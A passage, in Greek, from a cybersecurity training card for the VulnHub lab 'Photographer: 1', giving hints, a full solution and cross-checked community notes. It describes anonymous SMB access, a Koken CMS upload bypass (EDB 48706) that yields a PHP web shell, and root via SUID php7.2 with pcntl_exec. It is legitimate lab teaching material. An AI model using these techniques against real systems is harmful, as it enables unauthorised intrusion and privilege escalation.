Θύρες **80, 139, 445, 8000**. Δύο πράγματα αμέσως: διαβάστε τις **κεφαλίδες** στην 8000 (μία ονομάζει CMS **και την ακριβή του έκδοση**), και δοκιμάστε **ανώνυμη** πρόσβαση στα SMB shares.
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — το μερίσμα</strong></summary>

`smbmap -H TARGET` → `sambashare READ ONLY`. `smbclient //TARGET/sambashare -N` → `mailsent.txt` + `wordpress.bkp.zip`. Το email → `daisa@photographer.com` και υπόδειξη κωδικού **`babygirl`**.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — το CMS και η μεταφόρτωση</strong></summary>

`curl -sI http://TARGET:8000/` → `http-generator: Koken 0.22.24`. Admin `/admin/`· συνδεθείτε `daisa@photographer.com : babygirl`. `searchsploit koken` → **EDB 48706**. Ανεβάστε `shell.php.jpg` και **στο Burp αφαιρέστε το `.jpg`**.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — κέλυφος, user flag, root</strong></summary>

Listener **πρώτα**, μετά ζητήστε το `/storage/originals/xx/xx/shell.php` → `www-data`. `su daisa` με `babygirl` → user flag. `find / -perm -4000` → **`/usr/bin/php7.2`** → `php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` → root.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

1. `nmap -p-` → **80, 139, 445, 8000**. 2. `smbmap` → **`sambashare`** (READ ONLY). 3. `smbclient -N` → `mailsent.txt` + `wordpress.bkp.zip`. 4. email → **`babygirl`**. 5. `Koken 0.22.24`· admin `/admin/`. 6. **EDB 48706**: `shell.php.jpg` → Burp strip `.jpg` → `/storage/originals/…/shell.php` → `www-data`. 7. `su daisa` → user flag. 8. **SUID `php7.2`** → `pcntl_exec -p` → **euid=0** → `/root/proof.txt`.
</details>

---

# Μέρος Ζ — Παραπομπές

- **VulnHub entry:** <https://vulnhub.com/entry/photographer-1,519/>
- **Αγγλικό lab του αποθετηρίου:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)
- **Αγγλική έκδοση αυτής της κάρτας:** [Learning Path 1 — Photographer: 1](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/11-photographer-1.md)
- **Writeups που διασταυρώθηκαν** (επιβεβαιώνουν anonymous SMB, `babygirl`, EDB 48706, SUID php7.2):
  - [root&beer — Photographer 1](https://rootandbeer.com/walkthroughs/photographer-1/)
  - [tbhaxor — Photographer](https://tbhaxor.com/vulnhub-photographer-writeup/)
  - [Hitesh Kadu — Photographer](https://hitesh1210.github.io/posts/photographer-Writeup/)
  - [GTFOBins — php](https://gtfobins.github.io/gtfobins/php/)

- **Σημειώσεις κοινότητας — ομοφωνία, παγίδες και εναλλακτικές διαδρομές** (διασταυρωμένες με τις παρακάτω πηγές):
  - **Ομοφωνία:** `nmap -p-` → `80/139/445/8000` → anonymous SMB `sambashare` → υπόδειξη `babygirl` στο `mailsent.txt` → Koken 0.22.24 στο :8000, `/admin/` → login `daisa@photographer.com:babygirl` → EDB 48706 → upload `shell.php.jpg`, αφαίρεση του `.jpg` στο Burp → εκτέλεση `/storage/originals/xx/xx/shell.php` → www-data → SUID `/usr/bin/php7.2` → `pcntl_exec('/bin/sh',['-p'])` → root.
  - **Συχνή παγίδα:** το `-p` είναι υποχρεωτικό — χωρίς αυτό το bash ρίχνει το effective UID και το `id` δεν δείχνει ποτέ `euid=0`· χρησιμοποιήστε την απόλυτη διαδρομή `/usr/bin/php7.2`, αφού ένα `php` που λύνεται μέσω PATH μπορεί να μην είναι SUID.
  - **Συχνή παγίδα:** η παραποίηση της κατάληξης πρέπει να γίνει στο Burp (το JS του browser μπλοκάρει το `.php`), και η διαδρομή μεταφόρτωσης είναι ένας δι-επίπεδος **hashed** κατάλογος που αποκαλύπτεται μόνο μετά τη μεταφόρτωση — μην τον μαντεύετε· περάστε τον κέρσορα πάνω από το **Download File** στη βιβλιοθήκη Content ή διαβάστε τον από την απόκριση JSON του import.
  - **Συχνή παγίδα:** το `/home/daisa/user.txt` είναι `-rw-------`, άρα ο `www-data` δεν μπορεί να το διαβάσει — χρειάζεστε `su daisa` (κωδικός `babygirl`), δηλαδή επαναχώρηση διαπιστευτηρίων CMS→σύστημα.
  - **Εναλλακτική διαδρομή:** το `wordpress.bkp.zip` είναι decoy (χωρίς `wp-config.php`)· το LinPEAS βρίσκει επίσης τοπικά διαπιστευτήρια MySQL στο config του Koken (`/var/www/html/koken/storage/configuration/database.php`, χρήστης `kokenuser`), του οποίου ο πίνακας `koken_users` αποθηκεύει το bcrypt hash της daisa· και ένα payload Meterpreter `php/meterpreter/reverse_tcp` δουλεύει αντί για το shell του pentestmonkey (tbhaxor).
  - ⚠️ **Σημείωση επαλήθευσης:** ένα writeup (Hitesh Kadu) δείχνει το `user.txt` να διαβάζεται απευθείας ως `www-data`, ενώ το πλήρες lab του αποθετηρίου και άλλα χτυπούν `Permission denied` στο `-rw-------` — θεωρήστε το `su daisa` (ή root) απαραίτητο στην τρέχουσα εικόνα.
  - ⚠️ **Σημείωση επαλήθευσης:** το `wordpress.bkp.zip` είναι ~12.7 MB στην εκτέλεση του lab του αποθετηρίου αλλά ~13.9 MB σε άλλα writeups — η εικόνα εξήχθη ξανά· το μέγεθος είναι καλλωπιστικό και τα περιεχόμενα (stock WordPress, decoy) είναι τα ίδια.
  - **Επαληθευμένες πηγές:** [root&beer](https://rootandbeer.com/walkthroughs/photographer-1/) · [Infosec Articles](https://www.infosecarticles.com/photographer-1-vulnhub-walkthrough) · [tbhaxor](https://tbhaxor.com/vulnhub-photographer-writeup/) · [Hitesh Kadu](https://hitesh1210.github.io/posts/photographer-Writeup/)

---

# Μέρος Η — Αν κολλήσετε τελείως

- Επαληθεύστε τη συνδεσιμότητα: `ping TARGET`, `ip -br a`.
- Θυμηθείτε το **Burp** — ο client-side έλεγχος δεν παρακάμπτεται αλλιώς.
- Αν το ανεβασμένο αρχείο βγάλει 404, μαντέψατε τη hashed διαδρομή — ξαναδιαβάστε την από το tooltip **Download File** ή από το JSON του import.
- Αν το `id` δείξει `uid=33` χωρίς `euid=0`, ξεχάσατε το **`-p`**.
- Δείτε [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) και [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Επαναφέρετε το snapshot και ξανακάντε το από μνήμης.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 10 — PwnLab: init](<10-pwnlab-init.md>) · επόμενο: [Μηχάνημα 12 — symfonos: 1](<12-symfonos-1.md>) · πλήρες walkthrough: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)_
